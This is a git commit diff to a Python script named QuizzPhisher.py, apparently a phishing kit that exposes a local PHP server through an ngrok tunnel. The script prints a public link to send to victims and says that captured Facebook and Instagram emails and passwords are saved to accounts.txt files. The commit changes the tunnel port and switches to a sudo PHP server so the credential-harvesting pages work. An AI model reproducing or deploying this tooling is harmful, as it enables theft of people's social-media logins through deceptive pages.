dcc3c53b365afa180d48823f2579d14335a8e29d
Henrique Moura Gabriel <68467576+rootmoura@users.noreply.github.com>
2020-12-21 16:50:21 +0000

    Add files via upload
    php bug not generating file has been resolved

--- QuizzPhisher.py
+++ QuizzPhisher.py
@@ -5,7 +5,7 @@ from pyngrok import ngrok
 import subprocess 
 
 #VAR
-term = "/usr/bin/xterm"
+term  = "/usr/bin/xterm"
 ngrokProc = ngrok.get_ngrok_process()
 auth_login = input("\033[1;31m[+]Enter your authtoken(ngrok):\033[0m ")
 authtoken = "{}".format(auth_login)
@@ -30,11 +30,11 @@ print("""
 
 
 ngrok.set_auth_token(authtoken)
-ngrok_tunnel = ngrok.connect(80)
+ngrok_tunnel = ngrok.connect(665)
 print("\033[1;31msend this link: \033[0m" + ngrok_tunnel.public_url)
 print("\033[1;31mPasswords and emails are saved on facebook/accounts.txt\033[0m")
 print("\033[1;31mPasswords and emails are saved on instagram/accounts.txt\033[0m")
-subprocess.call([term, "-e", "python3 -m http.server 81"])
+subprocess.call([term, "-e", "sudo php -S 0.0.0.0:665 -t ."])
 
 try:
 	ngrokProc.proc.wait()
